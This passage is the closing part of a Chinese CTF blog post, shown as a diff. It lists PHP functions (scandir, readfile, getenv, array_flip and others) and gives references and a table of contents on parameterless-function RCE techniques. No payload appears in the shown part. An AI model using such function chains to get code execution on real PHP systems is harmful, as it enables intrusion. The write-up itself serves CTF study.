+scandir() 函数返回指定目录中的文件和目录的数组。
+dirname() 函数返回路径中的目录部分。
+chdir() 函数改变当前的目录。
+
+readfile()  输出一个文件
+
+current()       返回数组中的当前单元, 默认取第一个值
+pos()           current() 的别名
+next() 函数将内部指针指向数组中的下一个元素，并输出。
+end()       将内部指针指向数组中的最后一个元素，并输出。
+array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin — 转换十六进制字符串为二进制字符串
+
+getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)
+</code></pre><p>常见的就这么一些。先记录到这吧。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/" target="_blank" rel="noopener">http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/</a></li>
+<li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/08/22/简单的协程利用框架/" rel="next" title="协程初体验之简单的利用框架">
+                  <i class="fa fa-chevron-left"></i> 协程初体验之简单的利用框架
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
+          Tabla de contenidos
+        </li>
+        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+          Inicio
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc">
+            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#说在前面"><span class="nav-number">1.</span> <span class="nav-text">说在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#boringcode"><span class="nav-number">2.</span> <span class="nav-text">boringcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一个点："><span class="nav-number">2.1.</span> <span class="nav-text">第一个点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二个点："><span class="nav-number">2.2.</span> <span class="nav-text">第二个点：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无参数函数的利用总结"><span class="nav-number">3.</span> <span class="nav-text">无参数函数的利用总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取环境变量"><span class="nav-number">3.1.</span> <span class="nav-text">获取环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getallheaders-gt-RCE"><span class="nav-number">3.2.</span> <span class="nav-text">getallheaders() =&gt; RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-defined-vars-gt-RCE"><span class="nav-number">3.3.</span> <span class="nav-text">get_defined_vars() =&gt; RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session-id-gt-RCE"><span class="nav-number">3.4.</span> <span class="nav-text">session_id() =&gt; RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无参数函数小总结"><span class="nav-number">3.5.</span> <span class="nav-text">无参数函数小总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+          </div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Threezh1</p>
+  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">entradas</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categorías</span>
+        
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span>
+        
+      </div>
+    
+  </nav>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+    
+  </div>
+
+
+
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Threezh1</span>
+</div>
+  <div class="powered-by">Creado mediante <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Tema – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
+<script src="/js/schemes/pisces.js?v=7.3.0"></script>
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <script src="/js/post-details.js?v=7.3.0"></script>
+
+
+</body>
+</html>
